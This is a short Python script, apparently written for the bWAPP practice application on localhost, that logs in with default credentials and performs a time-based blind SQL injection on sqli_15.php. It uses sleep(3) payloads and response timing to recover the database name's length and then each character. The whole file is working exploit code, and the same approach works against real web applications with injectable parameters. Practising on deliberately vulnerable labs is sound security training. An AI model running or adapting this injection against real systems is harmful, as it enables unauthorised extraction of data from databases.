#!/usr/bin/python
#coding:utf-8
import requests
import time
#ip地址对应修改
ip_port="127.0.0.1:80"
data={
	"login":"bee",
	"password":"bug",
	"security_level":"0",
	"form":"submit"
}
urlLogin=f"http://{ip_port}/login.php"
session=requests.session()
resp=session.post(urlLogin,data)
num=0

#获取数据库名称长度
for i in range(1,21):
	url=f"http://{ip_port}/sqli_15.php?title=World War Z' and length(database())={i} and sleep(3) -- &action=search"
	startTime=time.time()
	rsp=session.get(url)
	endTime=time.time()
	ga=endTime-startTime
	if ga>1:
		print(f"length of database name is {i}")
		print(startTime)
		print(endTime)
		num=i
		break 

#获取数据库名字
l=[]
print(num)
for j in range(1,num+1):
	for k in range(33,128):
		url=f"http://{ip_port}/sqli_15.php?title=World War Z' and ascii(substr(database(),{j},1))={k}   and sleep(3) -- &action=search"
		startTime=time.time()
		rsp=session.get(url)
		endTime=time.time()
		ga=endTime-startTime
		if ga>1:
			print(chr(k))
			l.append(chr(k))
			break
print(l)

